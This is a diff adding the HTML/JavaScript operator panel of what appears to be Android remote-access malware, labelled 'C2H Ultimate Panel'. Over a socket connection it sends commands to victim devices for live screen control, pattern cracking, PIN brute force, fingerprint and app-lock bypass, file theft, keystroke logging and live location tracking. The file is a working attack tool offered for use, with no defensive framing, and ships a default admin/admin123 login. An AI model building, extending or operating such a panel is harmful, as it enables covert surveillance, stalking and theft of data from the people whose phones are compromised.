@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>C2H Ultimate Panel - Lock Screen Bypass</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+        
+        /* Login Page */
+        .login-container {
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-box {
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        
+        /* Main Panel */
+        .app-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            background: #0a0a0a;
+        }
+        
+        .top-bar {
+            height: 60px;
+            background: #111;
+            border-bottom: 1px solid #222;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+        
+        .main-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: #0f0f0f;
+            border-right: 1px solid #1a1a1a;
+            overflow-y: auto;
+            transition: transform 0.3s;
+        }
+        
+        .sidebar.collapsed {
+            transform: translateX(-280px);
+        }
+        
+        /* Device List */
+        .device-item {
+            padding: 15px;
+            border-bottom: 1px solid #1a1a1a;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .device-item:hover {
+            background: #1a1a1a;
+        }
+        
+        .device-item.active {
+            background: linear-gradient(135deg, #1e3a8a, #1e40af);
+            border-left: 3px solid #3b82f6;
+        }
+        
+        /* Control Panel */
+        .control-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .control-tabs {
+            display: flex;
+            background: #111;
+            border-bottom: 1px solid #222;
+            overflow-x: auto;
+        }
+        
+        .tab-btn {
+            padding: 12px 20px;
+            background: transparent;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+        
+        .tab-btn.active {
+            color: #3b82f6;
+            border-bottom: 2px solid #3b82f6;
+        }
+        
+        .tab-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .tab-pane {
+            display: none;
+        }
+        
+        .tab-pane.active {
+            display: block;
+        }
+        
+        /* Screen View */
+        .screen-container {
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 500px;
+        }
+        
+        #live-screen {
+            max-width: 100%;
+            max-height: 70vh;
+            object-fit: contain;
+            cursor: crosshair;
+        }
+        
+        /* Pattern Helper Grid */
+        .pattern-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        
+        .pattern-dot {
+            aspect-ratio: 1;
+            background: #1a1a1a;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .pattern-dot.selected {
+            background: #3b82f6;
+            transform: scale(1.1);
+        }
+        
+        .pattern-dot:hover {
+            background: #2d2d2d;
+        }
+        
+        /* Brute Force Progress */
+        .progress-bar {
+            height: 8px;
+            background: #1a1a1a;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #10b981);
+            transition: width 0.3s;
+        }
+        
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1a1a1a;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            z-index: 10000;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="login-page" class="login-container">
+    <div class="login-box">
+        <div class="text-center mb-8">
+            <i class="fas fa-skull text-5xl text-purple-500 mb-4"></i>
+            <h2 class="text-3xl font-bold text-white">C2H Panel</h2>
+            <p class="text-gray-400 mt-2">Ultimate Control Center</p>
+        </div>
+        <input type="text" id="login-username" placeholder="Username" class="w-full px-4 py-3 bg-black/50 border border-gray-700 rounded-xl text-white mb-3">
+        <input type="password" id="login-password" placeholder="Password" class="w-full px-4 py-3 bg-black/50 border border-gray-700 rounded-xl text-white mb-4">
+        <button onclick="login()" class="w-full py-3 bg-gradient-to-r from-blue-600 to-purple-600 rounded-xl text-white font-semibold">
+            <i class="fas fa-sign-in-alt mr-2"></i> Login
+        </button>
+        <div class="text-center text-gray-500 text-sm mt-4">
+            Default: admin / admin123
+        </div>
+    </div>
+</div>
+
+<!-- MAIN PANEL -->
+<div id="main-panel" class="app-container hidden">
+    <div class="top-bar">
+        <button onclick="toggleSidebar()" class="text-white text-xl">
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="text-white font-semibold">
+            <i class="fas fa-microchip text-blue-500 mr-2"></i>
+            C2H Ultimate Panel
+        </div>
+        <button onclick="logout()" class="text-red-500">
+            <i class="fas fa-sign-out-alt"></i>
+        </button>
+    </div>
+    
+    <div class="main-layout">
+        <!-- Sidebar with devices -->
+        <div id="sidebar" class="sidebar">
+            <div class="p-4 border-b border-gray-800">
+                <div class="text-gray-400 text-sm mb-2">Connected Devices</div>
+                <div class="text-white text-2xl font-bold" id="device-count">0</div>
+            </div>
+            <div id="devices-list"></div>
+        </div>
+        
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <div class="control-tabs">
+                <button class="tab-btn active" onclick="switchTab('screen')"><i class="fas fa-desktop mr-2"></i>Screen</button>
+                <button class="tab-btn" onclick="switchTab('bypass')"><i class="fas fa-unlock-alt mr-2"></i>Lock Bypass</button>
+                <button class="tab-btn" onclick="switchTab('files')"><i class="fas fa-folder mr-2"></i>Files</button>
+                <button class="tab-btn" onclick="switchTab('system')"><i class="fas fa-chart-line mr-2"></i>System</button>
+                <button class="tab-btn" onclick="switchTab('keylogger')"><i class="fas fa-keyboard mr-2"></i>Keylogger</button>
+                <button class="tab-btn" onclick="switchTab('location')"><i class="fas fa-map-marker-alt mr-2"></i>Location</button>
+            </div>
+            
+            <div class="tab-content">
+                <!-- Screen Tab -->
+                <div id="screen-tab" class="tab-pane active">
+                    <div class="screen-container">
+                        <img id="live-screen" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='1080' height='1920'%3E%3Crect width='1080' height='1920' fill='%23111111'/%3E%3Ctext x='540' y='960' text-anchor='middle' fill='%23333333' font-size='24'%3ENO DEVICE SELECTED%3C/text%3E%3C/svg%3E">
+                    </div>
+                    <div class="flex gap-2 mt-4 justify-center">
+                        <button onclick="sendCommand('back')" class="px-4 py-2 bg-gray-800 rounded-lg"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button onclick="sendCommand('home')" class="px-4 py-2 bg-gray-800 rounded-lg"><i class="fas fa-home"></i> Home</button>
+                        <button onclick="sendCommand('recents')" class="px-4 py-2 bg-gray-800 rounded-lg"><i class="fas fa-square"></i> Recents</button>
+                    </div>
+                    <div class="flex gap-2 mt-2 justify-center">
+                        <button onclick="sendVolumeUp()" class="px-4 py-2 bg-green-800 rounded-lg"><i class="fas fa-volume-up"></i> Vol+</button>
+                        <button onclick="sendVolumeDown()" class="px-4 py-2 bg-red-800 rounded-lg"><i class="fas fa-volume-down"></i> Vol-</button>
+                    </div>
+                    <div class="mt-4">
+                        <div class="flex gap-2">
+                            <input type="text" id="textInput" class="flex-1 px-4 py-2 bg-gray-800 rounded-lg text-white" placeholder="Type text to send...">
+                            <button onclick="sendText()" class="px-6 py-2 bg-blue-600 rounded-lg"><i class="fas fa-paper-plane"></i></button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Lock Bypass Tab -->
+                <div id="bypass-tab" class="tab-pane">
+                    <div class="space-y-6">
+                        <!-- Pattern Helper -->
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-draw-polygon text-yellow-500 mr-2"></i>Pattern Unlock Helper</h3>
+                            <div class="pattern-grid" id="pattern-grid">
+                                ${Array(9).fill().map((_, i) => `<div class="pattern-dot" data-num="${i}" onclick="togglePatternDot(${i})">${i+1}</div>`).join('')}
+                            </div>
+                            <div class="flex gap-2 mt-3">
+                                <button onclick="clearPattern()" class="flex-1 px-3 py-2 bg-gray-700 rounded-lg">Clear</button>
+                                <button onclick="sendPattern()" class="flex-1 px-3 py-2 bg-blue-600 rounded-lg">Send Pattern</button>
+                                <button onclick="crackPattern()" class="flex-1 px-3 py-2 bg-purple-600 rounded-lg">Auto Crack</button>
+                            </div>
+                            <div id="pattern-result" class="mt-3 text-sm text-gray-400"></div>
+                        </div>
+                        
+                        <!-- PIN Brute Force -->
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-hashtag text-red-500 mr-2"></i>PIN Brute Force</h3>
+                            <div class="space-y-3">
+                                <div>
+                                    <label class="text-gray-400 text-sm">PIN Length</label>
+                                    <select id="pin-length" class="w-full px-3 py-2 bg-gray-800 rounded-lg mt-1">
+                                        <option value="4">4 digits (10,000 combos)</option>
+                                        <option value="6">6 digits (1,000,000 combos)</option>
+                                    </select>
+                                </div>
+                                <button onclick="startPinBrute()" class="w-full py-2 bg-red-600 rounded-lg">
+                                    <i class="fas fa-bolt mr-2"></i>Start Brute Force
+                                </button>
+                                <div id="pin-progress" class="hidden">
+                                    <div class="progress-bar mt-2">
+                                        <div id="pin-progress-fill" class="progress-fill" style="width: 0%"></div>
+                                    </div>
+                                    <div id="pin-status" class="text-sm text-gray-400 mt-2 text-center"></div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Fingerprint Bypass -->
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-fingerprint text-green-500 mr-2"></i>Fingerprint Bypass</h3>
+                            <button onclick="bypassFingerprint()" class="w-full py-2 bg-green-600 rounded-lg">
+                                <i class="fas fa-magic mr-2"></i>Attempt Bypass
+                            </button>
+                            <div id="fingerprint-status" class="mt-2 text-sm text-gray-400"></div>
+                        </div>
+                        
+                        <!-- App Lock Cracker -->
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-lock text-orange-500 mr-2"></i>App Lock Cracker</h3>
+                            <div class="flex gap-2">
+                                <input type="text" id="target-app" placeholder="App package name (e.g., com.whatsapp)" class="flex-1 px-3 py-2 bg-gray-800 rounded-lg">
+                                <button onclick="crackAppLock()" class="px-4 py-2 bg-orange-600 rounded-lg">Crack</button>
+                            </div>
+                            <div id="applock-result" class="mt-2 text-sm text-gray-400"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Files Tab -->
+                <div id="files-tab" class="tab-pane">
+                    <div class="space-y-3">
+                        <div class="flex gap-2">
+                            <input type="text" id="file-path" value="/" class="flex-1 px-3 py-2 bg-gray-800 rounded-lg text-white">
+                            <button onclick="listFiles()" class="px-4 py-2 bg-blue-600 rounded-lg">Browse</button>
+                        </div>
+                        <div id="file-list" class="bg-gray-900 rounded-xl p-3 max-h-96 overflow-y-auto">
+                            <div class="text-gray-500 text-center">Select a device first</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="downloadSelected()" class="flex-1 px-4 py-2 bg-green-600 rounded-lg">
+                                <i class="fas fa-download mr-2"></i>Download Selected
+                            </button>
+                            <button onclick="bulkDownload()" class="flex-1 px-4 py-2 bg-purple-600 rounded-lg">
+                                <i class="fas fa-layer-group mr-2"></i>Bulk Download
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- System Tab -->
+                <div id="system-tab" class="tab-pane">
+                    <div id="system-info" class="grid grid-cols-2 gap-3">
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <div class="text-gray-400 text-sm">RAM Usage</div>
+                            <div class="text-2xl text-white font-bold" id="ram-usage">--</div>
+                            <div class="progress-bar mt-2"><div id="ram-bar" class="progress-fill" style="width: 0%"></div></div>
+                        </div>
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <div class="text-gray-400 text-sm">Storage</div>
+                            <div class="text-2xl text-white font-bold" id="storage-usage">--</div>
+                            <div class="progress-bar mt-2"><div id="storage-bar" class="progress-fill" style="width: 0%"></div></div>
+                        </div>
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <div class="text-gray-400 text-sm">Battery</div>
+                            <div class="text-2xl text-white font-bold" id="battery">--%</div>
+                        </div>
+                        <div class="bg-gray-900 rounded-xl p-4">
+                            <div class="text-gray-400 text-sm">Root Status</div>
+                            <div class="text-2xl text-white font-bold" id="root-status">--</div>
+                        </div>
+                    </div>
+                    <button onclick="refreshSystemInfo()" class="w-full mt-3 py-2 bg-blue-600 rounded-lg">Refresh System Info</button>
+                </div>
+                
+                <!-- Keylogger Tab -->
+                <div id="keylogger-tab" class="tab-pane">
+                    <div class="flex gap-2 mb-3">
+                        <button onclick="startKeylogger()" class="flex-1 py-2 bg-red-600 rounded-lg">Start Recording</button>
+                        <button onclick="stopKeylogger()" class="flex-1 py-2 bg-gray-600 rounded-lg">Stop</button>
+                        <button onclick="exportKeylogs()" class="flex-1 py-2 bg-green-600 rounded-lg">Export Logs</button>
+                    </div>
+                    <div id="keylogs" class="bg-gray-900 rounded-xl p-3 h-96 overflow-y-auto font-mono text-sm">
+                        <div class="text-gray-500">Keylogger idle...</div>
+                    </div>
+                </div>
+                
+                <!-- Location Tab -->
+                <div id="location-tab" class="tab-pane">
+                    <button onclick="getLocation()" class="w-full py-2 bg-blue-600 rounded-lg mb-3">Get Live Location</button>
+                    <div id="location-info" class="bg-gray-900 rounded-xl p-3">
+                        <div class="text-gray-500">No location data</div>
+                    </div>
+                    <div id="map" class="h-64 bg-gray-800 rounded-xl mt-3"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let socket = null;
+    let currentDevice = null;
+    let token = null;
+    let selectedPattern = [];
+    let screenWidth = 1080, screenHeight = 1920;
+    
+    // Login
+    async function login() {
+        const username = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+        
+        const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            token = data.token;
+            localStorage.setItem('c2h_token', token);
+            initSocket();
+            document.getElementById('login-page').classList.add('hidden');
+            document.getElementById('main-panel').classList.remove('hidden');
+            showToast('Login successful!');
+        } else {
+            showToast('Invalid credentials!');
+        }
+    }
+    
+    function logout() {
+        localStorage.removeItem('c2h_token');
+        location.reload();
+    }
+    
+    function initSocket() {
+        socket = io();
+        
+        socket.on('connect', () => {
+            socket.emit('panel_auth', token);
+        });
+        
+        socket.on('auth_success', () => {
+            console.log('Authenticated');
+        });
+        
+        socket.on('devices_list', (devices) => {
+            updateDeviceList(devices);
+        });
+        
+        socket.on('live_screen_update', (data) => {
+            if (data.deviceId === currentDevice && data.liveImage) {
+                document.getElementById('live-screen').src = 'data:image/jpeg;base64,' + data.liveImage;
+                screenWidth = data.screenWidth || 1080;
+                screenHeight = data.screenHeight || 1920;
+            }
+        });
+        
+        socket.on('pattern_hash_received', (data) => {
+            if (data.deviceId === currentDevice) {
+                document.getElementById('pattern-result').innerHTML = `
+                    <div class="text-green-500">✓ Pattern cracked: ${data.pattern || 'Not found'}</div>
+                    <div class="text-gray-500 text-xs">Hash: ${data.hash}</div>
+                `;
+            }
+        });
+        
+        socket.on('pin_brute_update', (data) => {
+            if (data.deviceId === currentDevice) {
+                const percent = (data.current / data.total) * 100;
+                document.getElementById('pin-progress-fill').style.width = percent + '%';
+                document.getElementById('pin-status').innerHTML = `Trying: ${data.currentPin} | Progress: ${percent.toFixed(2)}%`;
+                if (data.found) {
+                    showToast(`PIN Found: ${data.pin}`);
+                    document.getElementById('pin-progress').classList.add('hidden');
+                }
+            }
+        });
+        
+        socket.on('fingerprint_update', (data) => {
+            if (data.deviceId === currentDevice) {
+                document.getElementById('fingerprint-status').innerHTML = data.status;
+                if (data.bypassed) {
+                    showToast('Fingerprint bypassed!');
+                }
+            }
+        });
+        
+        socket.on('file_list_received', (data) => {
+            if (data.deviceId === currentDevice) {
+                displayFileList(data.files);
+            }
+        });
+        
+        socket.on('system_info_received', (data) => {
+            if (data.deviceId === currentDevice) {
+                updateSystemInfo(data.info);
+            }
+        });
+        
+        socket.on('keystroke_received', (data) => {
+            if (data.deviceId === currentDevice) {
+                addKeylog(data.key, data.app);
+            }
+        });
+        
+        socket.on('location_update', (data) => {
+            if (data.deviceId === currentDevice) {
+                displayLocation(data);
+            }
+        });
+    }
+    
+    function updateDeviceList(devices) {
+        const container = document.getElementById('devices-list');
+        document.getElementById('device-count').innerText = devices.length;
+        
+        if (devices.length === 0) {
+            container.innerHTML = '<div class="p-4 text-gray-500 text-center">No devices connected</div>';
+            return;
+        }
+        
+        container.innerHTML = devices.map(device => `
+            <div class="device-item ${currentDevice === device.deviceId ? 'active' : ''}" onclick="selectDevice('${device.deviceId}')">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <div class="text-white font-semibold">${device.deviceName}</div>
+                        <div class="text-gray-500 text-xs">${device.deviceId.substring(0, 12)}...</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-green-400 text-xs">● LIVE</div>
+                        <div class="text-gray-400 text-sm">${device.battery}%</div>
+                    </div>
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    function selectDevice(deviceId) {
+        currentDevice = deviceId;
+        updateDeviceList(Array.from(devicesList));
+        showToast('Device selected');
+        refreshSystemInfo();
+        listFiles();
+    }
+    
+    let devicesList = [];
+    socket?.on('devices_list', (devices) => { devicesList = devices; });
+    
+    function switchTab(tab) {
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
+        
+        event.target.closest('.tab-btn').classList.add('active');
+        document.getElementById(`${tab}-tab`).classList.add('active');
+    }
+    
+    function sendCommand(cmd) {
+        if (!currentDevice) { showToast('Select a device first'); return; }
+        socket.emit('panel_command', { targetId: currentDevice, type: 'global_action', data: { action: cmd } });
+        showToast(`Sent: ${cmd}`);
+    }
+    
+    function sendVolumeUp() { sendCommand('volume_up'); }
+    function sendVolumeDown() { sendCommand('volume_down'); }
+    
+    function sendText() {
+        const text = document.getElementById('textInput').value;
+        if (!text || !currentDevice) return;
+        socket.emit('panel_command', { targetId: currentDevice, type: 'type_text', data: { text } });
+        document.getElementById('textInput').value = '';
+        showToast(`Text sent: ${text.substring(0, 30)}`);
+    }
+    
+    // Pattern Helper Functions
+    function togglePatternDot(num) {
+        const index = selectedPattern.indexOf(num);
+        if (index === -1) {
+            selectedPattern.push(num);
+        } else {
+            selectedPattern.splice(index, 1);
+        }
+        updatePatternUI();
+    }
+    
+    function updatePatternUI() {
+        document.querySelectorAll('.pattern-dot').forEach((dot, i) => {
+            if (selectedPattern.includes(i)) {
+                dot.classList.add('selected');
+            } else {
+                dot.classList.remove('selected');
+            }
+        });
+        document.getElementById('pattern-result').innerHTML = `Pattern: ${selectedPattern.join('') || 'None'}`;
+    }
+    
+    function clearPattern() {
+        selectedPattern = [];
+        updatePatternUI();
+    }
+    
+    function sendPattern() {
+        if (!currentDevice) { showToast('Select device'); return; }
+        if (selectedPattern.length === 0) { showToast('Draw pattern first'); return; }
+        
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'draw_pattern',
+            data: { pattern: selectedPattern.join('') }
+        });
+        showToast('Pattern sent to device');
+    }
+    
+    function crackPattern() {
+        if (!currentDevice) { showToast('Select device'); return; }
+        socket.emit('get_pattern_hash', { deviceId: currentDevice });
+        showToast('Requesting pattern hash...');
+    }
+    
+    function startPinBrute() {
+        if (!currentDevice) { showToast('Select device'); return; }
+        const length = parseInt(document.getElementById('pin-length').value);
+        document.getElementById('pin-progress').classList.remove('hidden');
+        
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'brute_pin',
+            data: { length: length }
+        });
+        showToast(`PIN brute force started (${length} digits)`);
+    }
+    
+    function bypassFingerprint() {
+        if (!currentDevice) { showToast('Select device'); return; }
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'bypass_fingerprint',
+            data: {}
+        });
+        showToast('Attempting fingerprint bypass...');
+    }
+    
+    function crackAppLock() {
+        if (!currentDevice) { showToast('Select device'); return; }
+        const app = document.getElementById('target-app').value;
+        if (!app) { showToast('Enter app package name'); return; }
+        
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'crack_applock',
+            data: { package: app }
+        });
+        showToast(`Cracking ${app}...`);
+    }
+    
+    // File Manager
+    function listFiles() {
+        if (!currentDevice) return;
+        const path = document.getElementById('file-path').value;
+        socket.emit('request_file_list', { deviceId: currentDevice, path: path });
+    }
+    
+    function displayFileList(files) {
+        const container = document.getElementById('file-list');
+        if (!files || files.length === 0) {
+            container.innerHTML = '<div class="text-gray-500">No files found</div>';
+            return;
+        }
+        
+        container.innerHTML = files.map(file => `
+            <div class="flex items-center justify-between p-2 hover:bg-gray-800 rounded cursor-pointer" onclick="selectFile('${file.path}')">
+                <div class="flex items-center gap-2">
+                    <i class="fas ${file.isDirectory ? 'fa-folder text-yellow-500' : 'fa-file text-blue-500'}"></i>
+                    <span class="text-white">${file.name}</span>
+                </div>
+                <div class="text-gray-500 text-sm">${file.size || ''}</div>
+            </div>
+        `).join('');
+    }
+    
+    function selectFile(path) {
+        document.getElementById('file-path').value = path;
+        if (path.endsWith('/')) {
+            listFiles();
+        } else {
+            downloadFile(path);
+        }
+    }
+    
+    function downloadFile(path) {
+        if (!currentDevice) return;
+        socket.emit('request_download_file', { deviceId: currentDevice, path: path });
+        showToast('Downloading...');
+    }
+    
+    function downloadSelected() {
+        // Implement bulk download
+        showToast('Bulk download feature coming soon');
+    }
+    
+    function bulkDownload() {
+        showToast('Select files first');
+    }
+    
+    // System Info
+    function refreshSystemInfo() {
+        if (!currentDevice) return;
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'get_system_info',
+            data: {}
+        });
+    }
+    
+    function updateSystemInfo(info) {
+        document.getElementById('ram-usage').innerHTML = `${info.ramUsed}/${info.ramTotal} MB`;
+        document.getElementById('ram-bar').style.width = (info.ramUsed / info.ramTotal * 100) + '%';
+        document.getElementById('storage-usage').innerHTML = `${info.storageUsed}/${info.storageTotal} GB`;
+        document.getElementById('storage-bar').style.width = (info.storageUsed / info.storageTotal * 100) + '%';
+        document.getElementById('battery').innerHTML = `${info.battery}%`;
+        document.getElementById('root-status').innerHTML = info.rooted ? '✓ ROOTED' : '✗ Not Rooted';
+    }
+    
+    // Keylogger
+    function startKeylogger() {
+        if (!currentDevice) return;
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'start_keylogger',
+            data: {}
+        });
+        showToast('Keylogger started');
+    }
+    
+    function stopKeylogger() {
+        if (!currentDevice) return;
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'stop_keylogger',
+            data: {}
+        });
+        showToast('Keylogger stopped');
+    }
+    
+    function addKeylog(key, app) {
+        const container = document.getElementById('keylogs');
+        const logEntry = document.createElement('div');
+        logEntry.className = 'text-gray-300 border-b border-gray-800 py-1';
+        logEntry.innerHTML = `<span class="text-blue-400">[${new Date().toLocaleTimeString()}]</span> <span class="text-green-400">${app}:</span> ${key}`;
+        container.appendChild(logEntry);
+        container.scrollTop = container.scrollHeight;
+    }
+    
+    function exportKeylogs() {
+        const logs = document.getElementById('keylogs').innerText;
+        const blob = new Blob([logs], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `keylogs_${currentDevice}_${Date.now()}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+    
+    // Location
+    function getLocation() {
+        if (!currentDevice) return;
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'get_location',
+            data: {}
+        });
+    }
+    
+    function displayLocation(data) {
+        const container = document.getElementById('location-info');
+        container.innerHTML = `
+            <div class="space-y-2">
+                <div><span class="text-gray-400">Latitude:</span> <span class="text-white">${data.lat}</span></div>
+                <div><span class="text-gray-400">Longitude:</span> <span class="text-white">${data.lng}</span></div>
+                <div><span class="text-gray-400">Speed:</span> <span class="text-white">${data.speed || 0} km/h</span></div>
+                <div><span class="text-gray-400">Altitude:</span> <span class="text-white">${data.altitude || 0} m</span></div>
+                <div><span class="text-gray-400">Accuracy:</span> <span class="text-white">${data.accuracy || 0} m</span></div>
+            </div>
+        `;
+        
+        // Load Google Maps (you'll need an API key)
+        if (data.lat && data.lng) {
+            const mapFrame = document.createElement('iframe');
+            mapFrame.src = `https://maps.google.com/maps?q=${data.lat},${data.lng}&z=15&output=embed`;
+            mapFrame.className = 'w-full h-64 rounded-lg';
+            document.getElementById('map').innerHTML = '';
+            document.getElementById('map').appendChild(mapFrame);
+        }
+    }
+    
+    // Screen touch
+    document.getElementById('live-screen')?.addEventListener('click', (e) => {
+        if (!currentDevice) return;
+        const rect = e.target.getBoundingClientRect();
+        let x = ((e.clientX - rect.left) / rect.width) * screenWidth;
+        let y = ((e.clientY - rect.top) / rect.height) * screenHeight;
+        x = Math.max(0, Math.min(screenWidth, x));
+        y = Math.max(0, Math.min(screenHeight, y));
+        
+        socket.emit('panel_command', {
+            targetId: currentDevice,
+            type: 'touch_command',
+            data: { x: Math.round(x), y: Math.round(y) }
+        });
+    });
+    
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('collapsed');
+    }
+    
+    function showToast(msg) {
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerHTML = msg;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+    
+    // Auto-login if token exists
+    if (localStorage.getItem('c2h_token')) {
+        token = localStorage.getItem('c2h_token');
+        initSocket();
+        document.getElementById('login-page').classList.add('hidden');
+        document.getElementById('main-panel').classList.remove('hidden');
+    }
+</script>
+</body>
+</html>
